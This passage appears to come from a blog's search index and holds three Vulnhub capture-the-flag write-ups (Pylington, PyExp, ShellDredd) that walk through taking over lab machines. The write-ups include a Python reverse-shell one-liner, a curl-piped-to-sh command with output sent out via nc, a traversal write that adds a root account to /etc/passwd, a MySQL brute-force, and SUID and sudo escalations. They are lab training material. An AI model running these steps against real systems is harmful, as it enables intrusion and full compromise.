groups=0(root) context=system_u:system_r:unconfined_service_t:s0phineasRooted!" }, { "title": "PYLINGTON 1", "url": "/posts/PYLINGTON_1/", "categories": "Vulnhub, medium", "tags": "Writable /etc/passwd file", "date": "2021-04-25 20:00:00 +0800", "snippet": "Overview“PYLINGTON: 1” was quite a unique box as it really it good for you to think out of the box for ways to exploit the system. Box Difficulty Link Medium(personally) Vulnhub Link For this box I downloaded it off vulnhub and run it on my network.ReconAfter setting up the VM and it’s connection , to locate the ip I use arp-scan my-ipaddress/24 to find the ip.Pylington was hosted on 192.168.1.50As usual, the standard masscan follow by nmap.└─# masscan -p1-65535 192.168.1.50 --rate=1000 -e eth0Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-04-24 17:03:10 GMTInitiating SYN Stealth ScanScanning 1 hosts [65535 ports/host]Discovered open port 80/tcp on 192.168.1.50 └─# nmap -sV -sC -p 80 192.168.1.50 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 13:06 EDTNmap scan report for 192.168.1.50Host is up (0.00033s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)|_http-generator: Jekyll v4.1.1| http-methods: |_ Potentially risky methods: TRACE| http-robots.txt: 3 disallowed entries |_/register /login /zbir7mn240soxhicso2z|_http-server-header: Apache/2.4.46 (Unix) mod_wsgi/4.7.1 Python/3.9|_http-title: Pylington Cloud | The best way to run Python.MAC Address: 08:00:27:15:1C:66 (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.86 secondsFrom the output we can see that there is only port 80 HTTP open.HTTP - TCP 80From the nmap output we can see that there are interesting files shown in the robot.txt file:| http-robots.txt: 3 disallowed entries|_/register /login /zbir7mn240soxhicso2zLet check these one by one to see if there are anything interesting here:/Register:We can see that the photo above mentions that “Unfortunately, at this time, all but one of our servers have gone offline. As a result, we are not accepting any new registrations. However, if you are already a registered user, you can still sign in.”Welp, nothing else here./Login:The login page requires not only a username and password, but a challenge text where based on the equation given you have to give the output. Look’s like brute-forcing the users name and password might not be the right path here./zbir7mn240soxhicso2zLastly, the last site shows that it stores the credential.Username: stevePassword: bvbkukHAeVxtjjVHAfter logging in with the credentials above back at /Login, we are directed to here which allow us to access the Super Secret Python IDE.It looks like the IDE is a Python 3 program in the first input box is where we put our code In the second input box is the user input.It is noted that it is protected by the below“This online IDE is protected with NoImportOS™, an unescapable™ sandbox. NoImportOS™ is secure because of its simplicity; “A quick look at the security measurement of the code shows the below:def check_if_safe(code: str) -&amp;gt; bool: if &#39;import&#39; in code: # import is too dangerous return False elif &#39;os&#39; in code: # os is too dangerous return False elif &#39;open&#39; in code: # opening files is also too dangerous return False else: return TrueShell as HTTPLet’s do some serious thinking here!Our goal is obviously to get back a reverse shell back to the server , but looks like we cannot have the words import,os or open. Meaning we cannot import other python functions , import the os module or openany files.However take note , we still have access to other python builtin function!Let’s test to see if the above is true first.Okay, as expected, we can’t directly import .What if import is taken as a user input?Great, looks like the program doesn’t do a check on the input.So now we just have to find a way to execute the strings input as a command.After doing some research I found the below:Python’s exec() method executes the Python code you pass as a string or executable object argument.This is called dynamic execution because, in contrast to normal static Python code, you can generate code and execute it at runtime. This way, you can run programmatically-created Python code.I tried executing with the eval function at first but fail to do so. The reason why eval can’t be used is explained as the below.exec() can execute all Python source code, whereas eval() can only evaluate expressions.exec() always returns None, whereas eval() returns the result of the evaluated expression.eval(2+2)&amp;gt; 4Thus i crafted the a simple python script which take a user input and run the string input through the exec() python3 function.Python Code:user_inp = input(&#39;&#39;)exec(user_inp)User Input:import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.152&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)└─# nc -lvnp 4242 listening on [any] 4242 ...connect to [192.168.1.152] from (UNKNOWN) [192.168.1.50] 52724[http@archlinux /]$ whoamiwhoamihttp[http@archlinux /]$ ididuid=33(http) gid=33(http) groups=33(http)[http@archlinux /]$ Great we are now onto the server as HTTP user.shell as pyAfter doing some standard enumeration like running linpeas and other enumeration tool, the below stands out to me.http@archlinux tmp]$ python3 suid3num.py …[~] Custom SUID Binaries (Interesting Stuff)------------------------------/home/py/typing/usr/bin/ksu/usr/bin/chage/usr/bin/sg/usr/bin/unix_chkpwd/usr/bin/expiry/usr/bin/suexec------------------------------…… Let’s try running the /home/py/typing to see what it does.After running this the program, it seems to ask me to type the sentence the quick brown fox jumps over the lazy dog in order for it to give me a password.[http@archlinux tmp]$ /home/py/typing/home/py/typingLets play a game! If you can type the sentence below, then I&#39;ll tell you my password.the quick brown fox jumps over the lazy dogAfter typing the above sentence back into the program it output the password:the quick brown fox jumps over the lazy dog54ezhCGaJVLet’s try logging in as user py with the password above.[http@archlinux tmp]$ su -l pysu -l pyPassword: 54ezhCGaJV[py@archlinux ~]$ whoamiwhoamipy[py@archlinux ~]$ ididuid=1000(py) gid=1000(py) groups=1000(py)Great we are now have a shell as user py.Shell as RootDoing a quick enumeration on py folder we can observe the below :[py@archlinux ~]$ ls -lals -latotal 56dr-xr-xr-x 3 py py 4096 Apr 16 23:41 .drwxr-xr-x 3 root root 4096 Apr 7 18:43 ..-rw------- 1 py py 21 Dec 20 18:44 .bash_logout-rw------- 1 py py 57 Dec 20 18:44 .bash_profile-rw------- 1 py py 141 Dec 20 18:44 .bashrc-r-------- 1 py py 11 Apr 9 12:04 password.txtdrwx------ 2 py py 4096 Apr 9 19:31 secret_stuff-r-sr-xr-x 1 py py 19216 Apr 9 12:15 typing-r--r--r-- 1 py py 689 Apr 9 12:15 typing.cc-r-------- 1 py py 34 Apr 9 12:32 user.txt[py@archlinux ~]$ cd secret_stuffcd secret_stuff[py@archlinux secret_stuff]$ ls -lals -latotal 40drwx------ 2 py py 4096 Apr 9 19:31 .dr-xr-xr-x 3 py py 4096 Apr 16 23:41 ..-rwsr-xr-x 1 root root 26128 Apr 9 19:30 backup-rw-r--r-- 1 root root 586 Apr 9 19:30 backup.cc[py@archlinux secret_stuff]$ Interestingly , we can execute backup file even though the file is owned by root.Let’s take a look what this interesting file does.Running the program shows the below :[py@archlinux secret_stuff]$ ./backup./backupEnter a line of text to back up: 123123Enter a file to append the text to (must be inside the /srv/backups directory): /tmp/tmpThe file must be inside the /srv/backups directory! The program take in a user input Write it to a file which starts at /srv/backups directory.But what if point it to /srv/backups directory initially but chain it with directory traversal to point to somewhere else like py home folder?[py@archlinux secret_stuff]$ ./backup./backupEnter a line of text to back up: 123123Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../../../../../../home/py/touchme.txt/srv/backups/../../../../../../../home/py/touchme.txt[py@archlinux secret_stuff]$ cat /home/py/touchme.txtcat ../touchme.txt123Success!Now that we know that we can write to any file , a common privilege escalation method is to write to /etc/passwd folder which create a user running as rootWe can manually add a user “admin” with a password of “password” using the following syntax which home folder points at root. :admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash[py@archlinux secret_stuff]$ ./backup ./backup Enter a line of text to back up: admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../../../../etc/passwd /srv/backups/../../../../../etc/passwd [py@archlinux secret_stuff]$ su -l adminsu -l adminPassword: password[root@archlinux ~]# whoamiwhoamiroot[root@archlinux ~]# ididuid=0(root) gid=0(root) groups=0(root)And we are root!" }, { "title": "PYEXP 1", "url": "/posts/PYEXP_1/", "categories": "Vulnhub, medium", "tags": "gpg, nfs", "date": "2021-04-18 12:00:00 +0800", "snippet": "Overview“PYEXP: 1” is an interesting box as it teaches the concept of brute-forcing,database enumeration and exploiting dangerous python function. Box Difficulty Link Medium Vulnhub Link ReconAs usual, the standard masscan follow by nmap.# masscan -p1-65535 192.168.205.118 --rate=1000 -e tun0Discovered open port 3306/tcp on 192.168.205.118Discovered open port 1337/tcp on 192.168.205.118 └─# nmap -sV -sC -p 1337,3306 -oN /opt/OSCP_PlayG/PyExp/nmap_full.txt 192.168.205.118Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 11:25 EDT Nmap scan report for 192.168.205.118Host is up (0.25s latency).PORT STATE SERVICE VERSION1337/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 f7:af:6c:d1:26:94:dc:e5:1a:22:1a:64:4e:1c:34:a9 (RSA)| 256 46:d2:8d:bd:2f:9e:af:ce:e2:45:5c:a6:12:c0:d9:19 (ECDSA)|_ 256 8d:11:ed:ff:7d:c5:a7:24:99:22:7f:ce:29:88:b2:4a (ED25519)3306/tcp open mysql MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1| mysql-info: | Protocol: 10| Version: 5.5.5-10.3.23-MariaDB-0+deb10u1| Thread ID: 38| Capabilities flags: 63486| Some Capabilities: Support41Auth, SupportsTransactions, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsCompression, LongColumnFlag, Speaks41ProtocolOld, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: d5z)[o=~(GllWRri9}.i|_ Auth Plugin Name: mysql_native_passwordService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.69 secondsFrom the output we can see that there is a SSH server on port 1337 and a MySQL service at port 3306. Honestly, there isn’t much to work on so the only option I could think of was to brute-force MySQL for password.MYSQL - TCP 3306Brute-forcing root password:└─# hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.205.118 mysql Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-17 11:45:00[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task[DATA] attacking mysql://192.168.205.118:3306/[STATUS] 171.00 tries/min, 171 tries in 00:01h, 14344228 to do in 1398:05h, 4 active......[STATUS] 174.00 tries/min, 8178 tries in 00:47h, 14336221 to do in 1373:13h, 4 active[3306][mysql] host: 192.168.205.118 login: root password: prettywoman1 of 1 target successfully completed, 1 valid password foundThat took awhile but the result is that we obtain the root password for mysql. Let’s enumerate the database for any credentials we can use to access the SSH server!Shell as LucyEnumerating the database:└─# mysql --host 192.168.205.118 -u root -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 22205 Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10 MariaDB [(none)]&amp;gt; show databases; +--------------------+ | Database | +--------------------+| data || information_schema || mysql || performance_schema |+--------------------+4 rows in set (0.253 sec)MariaDB [(none)]&amp;gt; use data;Database changedMariaDB [data]&amp;gt; show tables;+----------------+| Tables_in_data |+----------------+| fernet |+----------------+1 row in set (0.270 sec)MariaDB [data]&amp;gt; select * from fernet;+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+| cred | keyy |+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+1 row in set (0.282 sec)After enumerating the database server there isn’t much but the above.As we can see from the above, there is a fernet table with the column name “cred” and “keyy” from the table name fernet.A quick google about fernet leads me to “fernet encryption”:Fernet is a symmetric encryption method which makes sure that the message encrypted cannot be manipulated/read without the key.When inputting the Token and Key into the site here, Fernet decryption!We get the credentials below:Decoded: lucy:wJ9`“Lemdv9[FEw-Great ! Now we have a possible username and password! Let’s try to SSH into the server└─# ssh lucy@192.168.205.118 -p 1337 lucy@192.168.205.118&#39;s password: Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.lucy@pyexp:~$ whoamilucyWith that we are now in the system running as lucy!Shell as RootOne of the first things i like to do is run beside running linpeas.sh is to run sudo -l to see if the current user is able to run any privilege commands which can be abused.lucy@pyexp:/tmp$ sudo -lMatching Defaults entries for lucy on pyexp: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser lucy may run the following commands on pyexp: (root) NOPASSWD: /usr/bin/python2 /opt/exp.pyInterestingly , we can run /usr/bin/python2 /opt/exp.py as root. A further look into the file reveals the belowlucy@pyexp:/tmp$ cat /opt/exp.pyuinput = raw_input(&#39;how are you?&#39;)exec(uinput)From the exp.py file above we can see that it takes a user input. But what is dangerous here is that the script uses the vulnerable exec function.Why is exec dangerous ? It is because it take strings and turn them into executable code! A user could build a string so that it runs other Python functions to potentially erase all your data, expose your secret keys, dump your database, or perform other malicious actions. Since we can execute the file as a root user, the command executed will be as root.Thus a simple way to become root would be to use the python function to spawn a bash shell!lucy@pyexp:/tmp$ sudo -u root /usr/bin/python2 /opt/exp.pyhow are you?import pty; pty.spawn(&quot;/bin/bash&quot;)root@pyexp:/tmp# whoamirootroot@pyexp:/tmp# iduid=0(root) gid=0(root) groups=0(root)And we are root!" }, { "title": "OnSystem ShellDredd", "url": "/posts/ONSYSTEM-HANNAH/", "categories": "Vulnhub, easy", "tags": "SUID", "date": "2021-04-15 12:00:00 +0800", "snippet": "Overview“ONSYSTEM: SHELLDREDD #1 HANNAH” is an easy boxes which is great for beginners to learn more about enumerating the poorly configured FTP port to search for sensitive information and escalate to root by exploiting SUID. Box Difficulty Link Easy Vulnhub Link For this box I will be attempting it on Offensive security PG Play .ReconI always like to start with Masscan to find all open port followed by nmap enumeration.masscan -p1-65535 192.168.109.130 --rate=1000 Discovered open port 21/tcp on 192.168.109.130 Discovered open port 61000/tcp on 192.168.109.130 # Nmap 7.91 scan initiated Sun Apr 11 03:44:50 2021 as: nmap -sV -sC -p 21,61000 -oN /opt/OSCP_PlayG/OnSystemShellDredd/nmap_full.txt 192.168.109.130Nmap scan report for 192.168.109.130Host is up (0.25s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.49.109| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status61000/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)| 256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)|_ 256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Apr 11 03:45:01 2021 -- 1 IP address (1 host up) scanned in 11.80 secondsThrough this we can see that there is a FTP server on port 21 and a SSH at port 61000.FTP - TCP 21We can see that anonymous login is allowed, let’s test it:# ftp 192.168.109.130Connected to 192.168.109.130.220 (vsFTPd 3.0.3)Name (192.168.109.130:kali): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; Next , let’s download all the files from the FTP server so we can look through the files : wget -m --no-passive ftp://anonymous:anonymous@192.168.109.130 --2021-04-13 03:05:02-- ftp://anonymous:*password*@192.168.109.130/ =&amp;gt; ‘192.168.109.130/.listing’ Connecting to 192.168.109.130:21... connected. Logging in as anonymous ... Logged in! ==&amp;gt; SYST ... done. ==&amp;gt; PWD ... done. ==&amp;gt; TYPE I ... done. ==&amp;gt; CWD not needed. ==&amp;gt; PORT ... done. ==&amp;gt; LIST ... done. ┌──(root💀kali)-[/opt/OSCP_PlayG/OnSystemShellDredd/192.168.109.130]└─# ls -laR.:total 16drwxr-xr-x 3 root root 4096 Apr 11 03:52 .drwxr-xr-x 4 root root 4096 Apr 13 03:05 ..drwxr-xr-x 2 root root 4096 Apr 11 03:52 .hannah-rw-r--r-- 1 root root 184 Apr 11 03:52 .listing./.hannah:total 16drwxr-xr-x 2 root root 4096 Apr 11 03:52 .drwxr-xr-x 3 root root 4096 Apr 11 03:52 ..-r-------- 1 root root 1823 Aug 6 2020 id_rsa-rw-r--r-- 1 root root 183 Apr 11 03:52 .listingGreat we can see that under the user folder .hannah , there is a id_rsa key.└─# cat id_rsa -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn....HvHD9hkCPIq7Sc/TAAAADXJvb3RAT2ZmU2hlbGwBAgMEBQ==-----END OPENSSH PRIVATE KEY-----Looking into the content of the file, we can see that this is a OPENSSH PRIVATE KEY, and can use this to ssh into the system as hannah most probably!Shell as HannahWe can see below that if we try to ssh as hannah using the private key,it is ignored as the permission are too open.─# ssh -i .hannah/id_rsa hannah@192.168.91.130 -p 61000 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for &#39;.hannah/id_rsa&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;.hannah/id_rsa&quot;: bad permissionshannah@192.168.91.130&#39;s password: Instead we have to ensure that the key is read-writeable by you only before we can ssh as hannah!# chmod 600 .hannah/id_rsa # ssh -i .hannah/id_rsa hannah@192.168.91.130 -p 61000Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.hannah@ShellDredd:~$ With that we are now in the shell as hannah!Shell as RootOne of the first things i like to do is run linpeas.sh#Excute from memory and send output back to the hostnc -lvnp 9002 | tee linpeas.out # On Host curl HOST-IP:8000/linpeas.sh | sh | nc HOST-IP 9002 #On VictimAfter running linpeash.sh we can see that there is a cpulimit has a SUID permission which we can exploit. This mean we can run cpulimit command as root.════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found strace Not Found -rwsr-sr-x 1 root root 120K Mar 23 2012 /usr/bin/mawk -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-sr-x 1 root root 23K Jun 23 2017 /usr/bin/cpulimit Thus to gain root privileges , we use cpulimit to copy bash into the temp directory, give it a “chmod +s” so that it maintains root privileges from suid.hannah@ShellDredd:~$ cpulimit -l 50 -f cp /bin/bash /tmp/bashProcess 1165 detectedChild process is finished, exiting...hannah@ShellDredd:~$ cpulimit -l 50 -f chmod +s /tmp/bashProcess 1167 detectedChild process is finished, exiting...hannah@ShellDredd:~$ /tmp/bash -pbash-5.0# whoamirootbash-5.0# iduid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)And we are root!" } ]
